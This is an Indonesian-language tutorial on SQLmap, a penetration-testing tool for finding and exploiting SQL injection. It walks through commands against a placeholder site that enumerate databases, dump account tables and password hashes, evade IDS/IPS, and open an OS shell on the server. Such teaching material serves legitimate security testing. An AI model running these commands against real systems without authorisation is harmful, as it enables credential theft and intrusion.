SQLmap

Alat otomatis untuk deteksi dan eksploitasi kerentanan SQL injection.

Apa itu SQLmap?

SQLmap adalah alat pengujian penetrasi sumber terbuka yang mengotomatiskan proses deteksi dan eksploitasi kerentanan SQL injection. Dengan mesin deteksi yang kuat, SQLmap mendukung berbagai jenis teknik SQL injection, termasuk berbasis boolean, berbasis waktu, berbasis kesalahan, berbasis UNION query, berbasis stacked queries, dan out-of-band. SQLmap dapat digunakan untuk menguji berbagai sistem manajemen basis data (DBMS) seperti MySQL, PostgreSQL, Oracle, Microsoft SQL Server, dan banyak lagi.

SQLmap tidak hanya mendeteksi SQL injection, tetapi juga dapat digunakan untuk mengeksploitasi kerentanan tersebut. Setelah berhasil dieksploitasi, SQLmap dapat digunakan untuk mengambil database, menjalankan perintah sistem operasi, dan bahkan mendapatkan shell interaktif pada server database (dalam kondisi tertentu).

Fitur Utama SQLmap

  • Dukungan Penuh untuk Berbagai Teknik SQL Injection: Boolean-based blind, Time-based blind, Error-based, UNION query-based, Stacked queries, Out-of-band.
  • Dukungan untuk Berbagai DBMS: MySQL, PostgreSQL, Oracle, Microsoft SQL Server, SQLite, Firebird, Sybase, SAP MaxDB, DB2, HSQLDB, Informix, dan lainnya.
  • Dukungan untuk Berbagai Teknik Otentikasi: HTTP Basic, HTTP Digest, berbasis Cookie, berbasis NTLM, berbasis Kerberos, berbasis sertifikat.
  • Kemampuan untuk Enumerasi Database: Enumerasi pengguna, password hash, hak akses, database, tabel, kolom.
  • Kemampuan untuk Mengakses Sistem File Dasar: Mengunggah dan mengunduh file dari server database.
  • Kemampuan untuk Menjalankan Perintah Sistem Operasi: Menjalankan perintah sistem operasi dan mendapatkan shell interaktif pada server database (jika DBMS mendukung).
  • Dukungan untuk Pemindaian Kerentanan Otomatis: Otomatisasi proses deteksi dan eksploitasi SQL injection.
  • Dukungan untuk Teknik Evasion IDS/IPS: Berbagai opsi untuk menghindari deteksi oleh sistem keamanan.
  • API Komprehensif: API untuk integrasi dengan alat lain atau skrip otomatisasi.

Contoh Penggunaan SQLmap (Lengkap dan Detail)

  1. Deteksi Dasar SQL Injection pada Parameter URL (GET):

    Uji apakah parameter GET rentan terhadap SQL Injection. Ini adalah kasus paling dasar.

    sqlmap -u "http://example.com/vuln.php?id=1"

    Perintah ini memberitahu SQLmap untuk menguji URL yang diberikan. SQLmap akan secara otomatis mencoba berbagai payload SQL Injection pada parameter 'id'.

  2. Deteksi SQL Injection pada Parameter POST Data:

    Uji SQL Injection pada parameter yang dikirim melalui metode POST (misalnya, form login).

    sqlmap -u "http://example.com/login.php" --data "username=test&password=test"

    Opsi --data digunakan untuk memberikan data POST. SQLmap akan menguji parameter 'username' dan 'password' untuk SQL Injection.

  3. Deteksi SQL Injection pada Cookie:

    Uji SQL Injection pada nilai cookie yang dikirim oleh server.

    sqlmap -u "http://example.com/index.php" --cookie "TRACKID=abcde12345"

    Opsi --cookie digunakan untuk menyertakan cookie dalam permintaan. SQLmap akan menguji nilai cookie 'TRACKID'.

  4. Deteksi Blind Time-Based SQL Injection:

    Uji Blind Time-Based SQL Injection, di mana tidak ada output langsung, tetapi respons server tertunda berdasarkan kondisi SQL.

    sqlmap -u "http://example.com/vuln.php?id=1" --technique=T

    Opsi --technique=T membatasi SQLmap untuk hanya menggunakan teknik Time-Based Blind SQL Injection. Teknik lain yang umum adalah B (Boolean-based blind), E (Error-based), U (UNION query-based).

  5. Enumerasi Database (Mendapatkan Daftar Database):

    Setelah menemukan SQL Injection, enumerasi database untuk mendapatkan daftar database yang tersedia.

    sqlmap -u "http://example.com/vuln.php?id=1" --dbs

    Opsi --dbs memberitahu SQLmap untuk melakukan enumerasi database dan menampilkan daftar database yang tersedia.

  6. Enumerasi Tabel dari Database Tertentu:

    Setelah mendapatkan daftar database, enumerasi tabel dari database tertentu (misalnya, database 'users').

    sqlmap -u "http://example.com/vuln.php?id=1" -D users --tables

    Opsi -D users menentukan database target ('users'), dan --tables memberitahu SQLmap untuk menampilkan daftar tabel dalam database tersebut.

  7. Enumerasi Kolom dari Tabel Tertentu:

    Setelah mendapatkan daftar tabel, enumerasi kolom dari tabel tertentu (misalnya, tabel 'users' dan 'accounts').

    sqlmap -u "http://example.com/vuln.php?id=1" -D users -T accounts --columns

    Opsi -T accounts menentukan tabel target ('accounts'), dan --columns memberitahu SQLmap untuk menampilkan daftar kolom dalam tabel tersebut.

  8. Dump Data dari Tabel Tertentu:

    Setelah mendapatkan daftar kolom, dump data dari tabel tertentu (misalnya, tabel 'users' dan 'accounts').

    sqlmap -u "http://example.com/vuln.php?id=1" -D users -T accounts --dump

    Opsi --dump memberitahu SQLmap untuk mendump semua data dari tabel yang ditentukan.

  9. Mendapatkan Password Hashes:

    Mencoba mendapatkan password hashes dari tabel pengguna (seringkali disimpan di kolom seperti 'password').

    sqlmap -u "http://example.com/vuln.php?id=1" -D users -T accounts -C username,password --dump

    Opsi -C username,password menentukan kolom yang akan di-dump ('username' dan 'password').

  10. Menjalankan Perintah Sistem Operasi (Jika Memungkinkan):

    Jika DBMS dan konfigurasi memungkinkan, mencoba menjalankan perintah sistem operasi pada server database.

    sqlmap -u "http://example.com/vuln.php?id=1" --os-shell

    Opsi --os-shell meminta SQLmap untuk mencoba mendapatkan shell sistem operasi. Ini mungkin tidak selalu berhasil tergantung pada DBMS dan hak akses.

Mulai Menggunakan SQLmap

  1. Instalasi: Unduh dan instal SQLmap dari website resminya ([http://sqlmap.org/](http://sqlmap.org/)). SQLmap adalah program Python, jadi pastikan Python sudah terinstal di sistem Anda. Kali Linux dan Parrot OS sudah menyertakan SQLmap secara default.
  2. Buka Terminal/Command Prompt: Buka terminal (Linux/macOS) atau Command Prompt (Windows).
  3. Pelajari Perintah Dasar: Beberapa perintah dasar SQLmap:
    • sqlmap -u [URL]: Uji SQL Injection pada URL.
    • sqlmap -u [URL] --data "[POST data]": Uji SQL Injection dengan data POST.
    • sqlmap -u [URL] --cookie "[cookie]": Uji SQL Injection dengan cookie.
    • sqlmap -u [URL] --dbs: Enumerasi database.
    • sqlmap -u [URL] -D [database] --tables: Enumerasi tabel dalam database.
    • sqlmap -u [URL] -D [database] -T [table] --columns: Enumerasi kolom dalam tabel.
    • sqlmap -u [URL] -D [database] -T [table] --dump: Dump data dari tabel.
    • sqlmap -u [URL] --os-shell: Mendapatkan OS shell (jika memungkinkan).
    • sqlmap --help: Menampilkan bantuan dan opsi SQLmap.
  4. Eksplorasi Opsi dan Teknik: Baca dokumentasi SQLmap dan coba berbagai opsi dan teknik untuk memahami kemampuan penuhnya.
  5. Gunakan dengan Etika: Gunakan SQLmap hanya untuk tujuan pembelajaran dan pengujian keamanan pada sistem yang Anda miliki izin untuk diuji. Penggunaan SQLmap tanpa izin adalah ilegal dan tidak etis.
